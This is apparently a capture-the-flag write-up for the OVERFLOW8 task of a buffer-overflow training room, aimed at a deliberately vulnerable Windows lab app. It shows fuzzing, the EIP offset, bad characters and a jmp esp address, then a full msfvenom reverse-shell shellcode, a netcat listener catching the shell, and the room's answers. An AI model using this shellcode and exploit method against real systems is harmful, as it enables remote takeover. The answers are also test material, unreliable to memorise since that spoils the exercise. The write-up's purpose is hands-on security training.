# OVERFLOW8
## Mona Configuration
```
!mona config -set workingfolder C:\mona\%p
```
## Fuzzing
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ ./fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Fuzzing with 300 bytes
Fuzzing with 400 bytes
Fuzzing with 500 bytes
Fuzzing with 600 bytes
Fuzzing with 700 bytes
Fuzzing with 800 bytes
Fuzzing with 900 bytes
Fuzzing with 1000 bytes
Fuzzing with 1100 bytes
Fuzzing with 1200 bytes
Fuzzing with 1300 bytes
Fuzzing with 1400 bytes
Fuzzing with 1500 bytes
Fuzzing with 1600 bytes
Fuzzing with 1700 bytes
Fuzzing with 1800 bytes
Fuzzing crashed at 1800 bytes
```
## Controlling EIP
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ cyclic 2200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaauzaavbaavcaavdaaveaavfaavgaavhaaviaavjaavkaavlaavmaavnaavoaavpaavqaavraavsaavtaavuaavvaavwaavxaavyaav
```
Program crashes with `61777261` in EIP register
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ python -c 'print(bytes.fromhex("61777261")[::-1].decode())'
arwa
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ cyclic -l arwa
1786
```
Offset to EIP is `1786` bytes
## Finding Bad Chars
Generate bytearray in Immunity:
```
!mona bytearray -b "\x00"
```
Bytearray for python script:
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ python -c '[print("\\x" + "{:02x}".format(x), end="") for x in range(1,256)]'
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
Re-run exploit and compare bytearray
```
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A4FA30
```
```
mona Memory comparison results
Address                    Status                     BadChars                               Type                       Location
0x01a4fa30                 Corruption after 28 bytes  00 1d 1e 2e 2f c7 c8 ee ef             normal                     Stack
```
Bad chars are `\x00\x1d\x2e\xc7\xee`
## Finding a Jump Point
```
!mona jmp -r esp -b "\x00\x1d\x2e\xc7\xee"
```
```
Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
```
We will jump to address `\xaf\x11\x50\x62`
## Payload
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ msfvenom -p windows/shell_reverse_tcp LHOST=10.6.23.1 LPORT=4444 EXITFUNC=thread -b "\x00\x1d\x2e\xc7\xee" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] =
"\xda\xd3\xd9\x74\x24\xf4\xba\xbe\x6c\xd3\xec\x5e\x29\xc9"
"\xb1\x52\x83\xc6\x04\x31\x56\x13\x03\xe8\x7f\x31\x19\xe8"
"\x68\x37\xe2\x10\x69\x58\x6a\xf5\x58\x58\x08\x7e\xca\x68"
"\x5a\xd2\xe7\x03\x0e\xc6\x7c\x61\x87\xe9\x35\xcc\xf1\xc4"
"\xc6\x7d\xc1\x47\x45\x7c\x16\xa7\x74\x4f\x6b\xa6\xb1\xb2"
"\x86\xfa\x6a\xb8\x35\xea\x1f\xf4\x85\x81\x6c\x18\x8e\x76"
"\x24\x1b\xbf\x29\x3e\x42\x1f\xc8\x93\xfe\x16\xd2\xf0\x3b"
"\xe0\x69\xc2\xb0\xf3\xbb\x1a\x38\x5f\x82\x92\xcb\xa1\xc3"
"\x15\x34\xd4\x3d\x66\xc9\xef\xfa\x14\x15\x65\x18\xbe\xde"
"\xdd\xc4\x3e\x32\xbb\x8f\x4d\xff\xcf\xd7\x51\xfe\x1c\x6c"
"\x6d\x8b\xa2\xa2\xe7\xcf\x80\x66\xa3\x94\xa9\x3f\x09\x7a"
"\xd5\x5f\xf2\x23\x73\x14\x1f\x37\x0e\x77\x48\xf4\x23\x87"
"\x88\x92\x34\xf4\xba\x3d\xef\x92\xf6\xb6\x29\x65\xf8\xec"
"\x8e\xf9\x07\x0f\xef\xd0\xc3\x5b\xbf\x4a\xe5\xe3\x54\x8a"
"\x0a\x36\xfa\xda\xa4\xe9\xbb\x8a\x04\x5a\x54\xc0\x8a\x85"
"\x44\xeb\x40\xae\xef\x16\x03\xdb\xe9\x0f\xd2\xb3\xf7\x2f"
"\xc5\x1f\x71\xc9\x8f\x8f\xd7\x42\x38\x29\x72\x18\xd9\xb6"
"\xa8\x65\xd9\x3d\x5f\x9a\x94\xb5\x2a\x88\x41\x36\x61\xf2"
"\xc4\x49\x5f\x9a\x8b\xd8\x04\x5a\xc5\xc0\x92\x0d\x82\x37"
"\xeb\xdb\x3e\x61\x45\xf9\xc2\xf7\xae\xb9\x18\xc4\x31\x40"
"\xec\x70\x16\x52\x28\x78\x12\x06\xe4\x2f\xcc\xf0\x42\x86"
"\xbe\xaa\x1c\x75\x69\x3a\xd8\xb5\xaa\x3c\xe5\x93\x5c\xa0"
"\x54\x4a\x19\xdf\x59\x1a\xad\x98\x87\xba\x52\x73\x0c\xda"
"\xb0\x51\x79\x73\x6d\x30\xc0\x1e\x8e\xef\x07\x27\x0d\x05"
"\xf8\xdc\x0d\x6c\xfd\x99\x89\x9d\x8f\xb2\x7f\xa1\x3c\xb2"
"\x55";
```
## Exploit
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ ./exploit.py
Sending evil buffer...
Done!
```
```
user@arch:~/cyber/thm/bufferoverflowprep/OVERFLOW 8$ nc -lnvp 4444
Connection from 10.10.39.227:49260
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>echo PWNED OVERFLOW8 YAY
echo PWNED OVERFLOW8 YAY
PWNED OVERFLOW8 YAY

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```
## Questions
What is the EIP offset for OVERFLOW8?
```
1786
```
In byte order (e.g. \\x00\\x01\\x02) and including the null byte \\x00, what were the badchars for OVERFLOW8?
```
\x00\x1d\x2e\xc7\xee
```